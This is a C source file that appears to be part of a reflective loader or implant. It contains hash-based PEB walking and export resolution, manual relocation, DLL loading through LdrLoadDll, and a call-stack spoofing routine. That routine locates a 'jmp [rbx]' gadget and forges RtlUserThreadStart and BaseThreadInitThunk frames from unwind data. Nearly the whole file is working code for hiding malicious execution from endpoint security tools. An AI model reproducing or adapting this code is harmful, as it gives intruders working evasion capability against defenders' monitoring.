#include <Macros.h>
#include <winternl.h>
#include <Funcs.h>
#include <winnt.h>

SEC( text, B ) PVOID HashString( PVOID String, UINT_PTR Length)
{
	ULONG 	Hash 	= 5381;
	PUCHAR 	Ptr 	= String;
	
	do
	{
		UCHAR character = *Ptr;

		if ( ! Length )
		{
			if ( !*Ptr ) break;
		}
		else
		{
			if ( (ULONG) (Ptr - (PUCHAR)String ) >= Length ) break;
			if ( !*Ptr ) ++Ptr;
		}

		if ( character >= 'a' )
		{
			character -= 0x20;
		}

		Hash = ( (Hash<<5) + Hash ) + character;
		++Ptr;
	} while ( TRUE );

	return Hash;
}

SEC( text, B ) PVOID LdrModulePeb ( PVOID hModuleHash )
{
	PLDR_DATA_TABLE_ENTRY pModule      = ( PLDR_DATA_TABLE_ENTRY ) ( ( PPEB ) PPEB_PTR )->Ldr->InMemoryOrderModuleList.Flink;
	PLDR_DATA_TABLE_ENTRY pFirstModule = pModule;
	do
	{
        if ( pModule->FullDllName.Buffer && pModule->FullDllName.Length )
        {
            DWORD ModuleHash  = HashString( pModule->FullDllName.Buffer, pModule->FullDllName.Length );
            DWORD ModuleHash2 = HashString( pModule->FullDllName.Buffer, pModule->FullDllName.Length - 8); // no ".dll"

            if ( ModuleHash == hModuleHash || ModuleHash2 == hModuleHash )
            {
                return ( UINT_PTR ) pModule->Reserved2[ 0 ];
            }
        }
        pModule = ( PLDR_DATA_TABLE_ENTRY ) pModule->Reserved1[ 0 ];
	} while ( pModule && pModule != pFirstModule );

	return 0;
}

SEC( text, B ) PVOID LdrFunctionAddr( UINT_PTR Module, UINT_PTR FunctionHash )
{
	PIMAGE_NT_HEADERS       ModuleNtHeader          = NULL;
	PIMAGE_EXPORT_DIRECTORY ModuleExportedDirectory = NULL;
	PDWORD                	AddressOfFunctions      = NULL;
	PDWORD                  AddressOfNames          = NULL;
	PWORD                   AddressOfNameOrdinals   = NULL;
    DWORD                   ExportDirVirtualAddress = NULL;
    DWORD                   ExportDirSize           = NULL;

	ModuleNtHeader          = (PVOID) ( Module + ( ( PIMAGE_DOS_HEADER ) Module )->e_lfanew );
    ExportDirVirtualAddress = ModuleNtHeader->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].VirtualAddress;
    ExportDirSize           = ModuleNtHeader->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].Size;
	ModuleExportedDirectory = (PVOID) ( Module + ExportDirVirtualAddress );

	AddressOfNames          = (PVOID) ( Module + ModuleExportedDirectory->AddressOfNames );
	AddressOfFunctions      = (PVOID) ( Module + ModuleExportedDirectory->AddressOfFunctions );
	AddressOfNameOrdinals   = (PVOID) ( Module + ModuleExportedDirectory->AddressOfNameOrdinals );

	for (DWORD i = 0; i < ModuleExportedDirectory->NumberOfNames; i++)
	{
        PVOID FuncName = (PVOID) ( Module + AddressOfNames[ i ] );
        PVOID FuncAddr = (PVOID) ( Module + AddressOfFunctions[ AddressOfNameOrdinals [ i ] ] );
        
        if ( HashString( FuncName, 0 ) == FunctionHash )
        {
            // This handles forwarders
            if ( FuncAddr > Module + ModuleNtHeader->OptionalHeader.DataDirectory[ 0 ].VirtualAddress && 
                 FuncAddr < Module + ModuleNtHeader->OptionalHeader.DataDirectory[ 0 ].VirtualAddress + ModuleNtHeader->OptionalHeader.DataDirectory[ 0 ].Size
               ) // Forwarders are outside .text
            {
                CHAR ModuleName[ MAX_PATH ] = { 0 };
                DWORD Offset                = 0;
                LPCSTR ExportModule         = NULL;
                SIZE_T ModuleAndExportLen   = 0;
                PVOID ModuleAddr            = NULL;
                DWORD64 ModuleHash          = 0;
                LPCSTR ExportName           = NULL;

                ExportModule         = FuncAddr;
                ModuleAndExportLen   = KStringLengthA( FuncAddr );

                for ( ; Offset < ModuleAndExportLen ; Offset++ )
                {
                    if ( HashString( ExportModule + Offset, 1 ) == 0x2b5d3) // Hashed "."
                        break;
                }

                RtlSecureZeroMemory( ModuleName, Offset * 2 );
                KCharStringToWCharString( ModuleName, ExportModule, Offset );

                ModuleAddr     = LdrModulePeb( HashString( ModuleName, Offset * 2 ) );

                if ( !ModuleAddr ) // Module not in PEB, spoof the load
                {
                    PRM p = { 0 };
                    PrepSpoof( &p );
                    ModuleAddr = KLoadLibrary( LdrFunctionAddr( LdrModulePeb( NTDLL_HASH ), SYS_LDRLOADDLL ), ExportModule, &p );
                }
                ModuleHash   = HashString( ExportModule + Offset + 1, 0 );
                ExportName   = ExportModule + Offset + 1;

                return LdrFunctionAddr( ModuleAddr, HashString( ExportName, 0 ) );
            }

            return FuncAddr;
        }
	}
}

SEC( text, B ) VOID KaynLdrReloc( PVOID KaynImage, PVOID ImageBase, PVOID BaseRelocDir )
{
    PIMAGE_BASE_RELOCATION  pImageBR = BaseRelocDir;
    PVOID                   OffsetIB = KaynImage - ImageBase ;
    PIMAGE_RELOC            Reloc    = NULL;

    while( pImageBR->VirtualAddress != 0 )
    {
        Reloc = ( PIMAGE_RELOC ) ( pImageBR + 1 );

        while ( ( PBYTE ) Reloc != ( PBYTE ) pImageBR + pImageBR->SizeOfBlock )
        {
            if ( Reloc->type == IMAGE_REL_TYPE )
                *( ULONG_PTR* ) ( ( UINT_PTR ) ( KaynImage ) + pImageBR->VirtualAddress + Reloc->offset ) += ( ULONG_PTR ) OffsetIB;

            else if ( Reloc->type != IMAGE_REL_BASED_ABSOLUTE )
                __debugbreak(); // TODO: handle this error

            Reloc++;
        }

        pImageBR = ( PIMAGE_BASE_RELOCATION ) Reloc;
    }
}

SEC( text, B ) PVOID KLoadLibrary(LdrLoadDll_t pLdrLoadDll, LPSTR ModuleName, PPRM p )
{
    if ( ! ModuleName )
        return NULL;

    UNICODE_STRING  UnicodeString           = { 0 };
    WCHAR           ModuleNameW[ MAX_PATH ] = { 0 };
    DWORD           dwModuleNameSize        = KStringLengthA( ModuleName );
    HMODULE         Module                  = NULL;
	LdrLoadDll_t    LdrLoadDll              = (LdrLoadDll_t)pLdrLoadDll;

    KCharStringToWCharString( ModuleNameW, ModuleName, dwModuleNameSize );

    if ( ModuleNameW )
    {
        USHORT DestSize             = KStringLengthW( ModuleNameW ) * sizeof( WCHAR );
        UnicodeString.Length        = DestSize;
        UnicodeString.MaximumLength = DestSize + sizeof( WCHAR );
    }

    UnicodeString.Buffer = ModuleNameW;

    if ( NT_SUCCESS( Spoof( NULL, (PVOID) 0, &UnicodeString, &Module, p, pLdrLoadDll, (PVOID)0 ) ) )
        return Module;
    else
        return NULL;
}

SEC( text, B ) SIZE_T KCharStringToWCharString( PWCHAR Destination, PCHAR Source, SIZE_T MaximumAllowed )
{
    INT Length = MaximumAllowed;

    while (--Length >= 0)
    {
        if (!(*Destination++ = *Source++))
            return MaximumAllowed - Length - 1;
    }

    return MaximumAllowed - Length;
}

SEC( text, B ) SIZE_T KStringLengthA( LPCSTR String )
{
    LPCSTR String2 = String;
    for (String2 = String; *String2; ++String2);
    return (String2 - String);
}

SEC( text, B ) SIZE_T KStringLengthW( LPCWSTR String )
{
    LPCWSTR String2;

    for (String2 = String; *String2; ++String2);

    return (String2 - String);
}
// Vx Underground
SEC( text, B ) PVOID CopyMemoryEx(_Inout_ PVOID Destination, _In_ CONST PVOID Source, _In_ SIZE_T Length)
{
	PBYTE D = (PBYTE)Destination;
	PBYTE S = (PBYTE)Source;

	while (Length--)
		*D++ = *S++;

	return Destination;
}


SEC( text, B ) PVOID FindGadget(LPBYTE Module, ULONG Size)
{
    for ( int x = 0; x < Size - 1; x++ ) {
        if ( Module[ x ] == 0xFF && Module[ x + 1 ] == 0x23 ) {
            return (PVOID)( Module + x );
        }
    }

    return NULL;
}


SEC( text, B ) PRUNTIME_FUNCTION GetRuntimeFunction( PVOID Address, PVOID* ImageBase )
{
    // Walk the PEB Modules, try to find the module that function falls within
    PLDR_DATA_TABLE_ENTRY pModule      = ( PLDR_DATA_TABLE_ENTRY ) ( ( PPEB ) PPEB_PTR )->Ldr->InMemoryOrderModuleList.Flink;
	PLDR_DATA_TABLE_ENTRY pFirstModule = pModule;
	do
	{

        // Get Size of DLL;
        PVOID                 Base          = NULL;
        PIMAGE_NT_HEADERS     NtHeaders     = NULL;
        PIMAGE_SECTION_HEADER SecHeader     = NULL;
        DWORD                 TextSize      = NULL;
        PVOID                 LowerBound    = NULL;
        PVOID                 UpperBound    = NULL;
        
        Base            = pModule->Reserved2[ 0 ];
        if ( Base )
        {
            if ( *( PWORD )( Base ) == 0x5A4D )
            {
                
                NtHeaders		= (PVOID) ( Base + ( ( PIMAGE_DOS_HEADER ) Base )->e_lfanew );
                
                if ( *( PWORD )NtHeaders == 0x4550 )
                {
                    if ( NtHeaders->FileHeader.Characteristics & 0x2000 )
                    {

                        SecHeader 		= IMAGE_FIRST_SECTION( NtHeaders );

                        for ( int i = 0; i < NtHeaders->FileHeader.NumberOfSections; i++ )
                        {
                            if ( HashString( SecHeader[ i ].Name, 0 ) ==  H_PDATA )
                            {
                                LowerBound      = (PBYTE) Base + SecHeader[ i ].VirtualAddress;
                                UpperBound      = (PBYTE) LowerBound + SecHeader[ i ].Misc.VirtualSize;
                            }
                        }

                        if ( LowerBound && UpperBound )
                        {
                            // Let's find the PRUNTIME_FUNCTION in the pdata
                            PVOID RelativeAddress  =  Address - Base;

                            for ( PRUNTIME_FUNCTION p = LowerBound; p < UpperBound ; p++ )
                            {
                                if ( RelativeAddress >= p->BeginAddress && RelativeAddress <= p->EndAddress )
                                {
                                    *ImageBase = Base;
                                    return p;
                                }
                            }
                        }
                    }
                }
            }
        }
        pModule = ( PLDR_DATA_TABLE_ENTRY ) pModule->Reserved1[ 0 ];
	
    } while ( pModule && pModule != pFirstModule );

    return NULL;
}
/* Credit to VulcanRaven project for the original implementation of these two*/
SEC( text, B ) ULONG CalculateFunctionStackSize( PRUNTIME_FUNCTION pRuntimeFunction, const DWORD64 ImageBase )
{
    NTSTATUS status = STATUS_SUCCESS;
    PUNWIND_INFO pUnwindInfo = NULL;
    ULONG unwindOperation = 0;
    ULONG operationInfo = 0;
    ULONG index = 0;
    ULONG frameOffset = 0;
    StackFrame stackFrame = { 0 };


    // [0] Sanity check incoming pointer.
    if (!pRuntimeFunction)
    {
        status = STATUS_INVALID_PARAMETER;
        goto Cleanup;
    }

    // [1] Loop over unwind info.
    // NB As this is a PoC, it does not handle every unwind operation, but
    // rather the minimum set required to successfully mimic the default
    // call stacks included.
    pUnwindInfo = (PUNWIND_INFO)(pRuntimeFunction->UnwindData + ImageBase);
    while (index < pUnwindInfo->CountOfCodes)
    {
        unwindOperation = pUnwindInfo->UnwindCode[index].UnwindOp;
        operationInfo = pUnwindInfo->UnwindCode[index].OpInfo;
        // [2] Loop over unwind codes and calculate
        // total stack space used by target Function.
        switch (unwindOperation) {
        case UWOP_PUSH_NONVOL:
            // UWOP_PUSH_NONVOL is 8 bytes.
            stackFrame.totalStackSize += 8;
            // Record if it pushes rbp as
            // this is important for UWOP_SET_FPREG.
            if (RBP_OP_INFO == operationInfo)
            {
                stackFrame.pushRbp = true;
                // Record when rbp is pushed to stack.
                stackFrame.countOfCodes = pUnwindInfo->CountOfCodes;
                stackFrame.pushRbpIndex = index + 1;
            }
            break;
        case UWOP_SAVE_NONVOL:
            //UWOP_SAVE_NONVOL doesn't contribute to stack size
            // but you do need to increment index.
            index += 1;
            break;
        case UWOP_ALLOC_SMALL:
            //Alloc size is op info field * 8 + 8.
            stackFrame.totalStackSize += ((operationInfo * 8) + 8);
            break;
        case UWOP_ALLOC_LARGE:
            // Alloc large is either:
            // 1) If op info == 0 then size of alloc / 8
            // is in the next slot (i.e. index += 1).
            // 2) If op info == 1 then size is in next
            // two slots.
            index += 1;
            frameOffset = pUnwindInfo->UnwindCode[index].FrameOffset;
            if (operationInfo == 0)
            {
                frameOffset *= 8;
            }
            else
            {
                index += 1;
                frameOffset += (pUnwindInfo->UnwindCode[index].FrameOffset << 16);
            }
            stackFrame.totalStackSize += frameOffset;
            break;
        case UWOP_SET_FPREG:
            // This sets rsp == rbp (mov rsp,rbp), so we need to ensure
            // that rbp is the expected value (in the frame above) when
            // it comes to spoof this frame in order to ensure the
            // call stack is correctly unwound.
            stackFrame.setsFramePointer = true;
            break;
        default:
            status = STATUS_ASSERTION_FAILURE;
            break;
        }

        index += 1;
    }

    // If chained unwind information is present then we need to
    // also recursively parse this and add to total stack size.
    if (0 != (pUnwindInfo->Flags & UNW_FLAG_CHAININFO))
    {
        index = pUnwindInfo->CountOfCodes;
        if (0 != (index & 1))
        {
            index += 1;
        }
        pRuntimeFunction = (PRUNTIME_FUNCTION)(&pUnwindInfo->UnwindCode[index]);
        return CalculateFunctionStackSize(pRuntimeFunction, ImageBase);
    }

    // Add the size of the return address (8 bytes).
    stackFrame.totalStackSize += 8;

    return stackFrame.totalStackSize;
	Cleanup:
		return status;
}
SEC( text, B ) ULONG CalculateFunctionStackSizeWrapper( PVOID ReturnAddress )
{
    NTSTATUS status = STATUS_SUCCESS;
    PRUNTIME_FUNCTION pRuntimeFunction = NULL;
    DWORD64 ImageBase = 0;
    PUNWIND_HISTORY_TABLE pHistoryTable = NULL;
    // [0] Sanity check return address.
    if (!ReturnAddress)
    {
        status = STATUS_INVALID_PARAMETER;
        goto Cleanup;
    }

    // [1] Locate RUNTIME_FUNCTION for given Function.
    //pRuntimeFunction = mRtlLookupFunctionEntry((DWORD64)ReturnAddress, &ImageBase, pHistoryTable);
    pRuntimeFunction = GetRuntimeFunction( ReturnAddress, &ImageBase );
    if (NULL == pRuntimeFunction)
    {
        status = STATUS_ASSERTION_FAILURE;
        goto Cleanup;
    }

    // [2] Recursively calculate the total stack size for the Function we are "returning" to.
    return CalculateFunctionStackSize(pRuntimeFunction, ImageBase);

	Cleanup:
		return status;
}

SEC( text, B ) VOID PrepSpoof(PPRM Param)
{
	Param->trampoline 		= FindGadget( LdrModulePeb( K32_HASH ) + 0x1000, 0x200000 );
	Param->Gadget_ss		= CalculateFunctionStackSizeWrapper( Param->trampoline );

	Param->RUTS_retaddr 	= ( PBYTE ) LdrFunctionAddr( LdrModulePeb( NTDLL_HASH ), H_RtlUserThreadStart ) + 0x21 ;
	Param->RUTS_ss			= CalculateFunctionStackSizeWrapper( Param->RUTS_retaddr );

	Param->BTIT_retaddr		= ( PBYTE ) LdrFunctionAddr( LdrModulePeb( K32_HASH ), H_BaseThreadInitThunk ) + 0x14 ; 
	Param->BTIT_ss			= CalculateFunctionStackSizeWrapper( Param->BTIT_retaddr );

	Param->Fixup			= GET_SYMBOL( Fixup );
	return;
} 

SEC( text, B ) PVOID WINAPI RtlSecureZeroMemory(PVOID ptr,SIZE_T cnt)
{
  volatile PCHAR vptr = (volatile PCHAR)ptr;
  while (cnt != 0)
    {
      *vptr++ = 0;
      cnt--;
    }
  return ptr;
}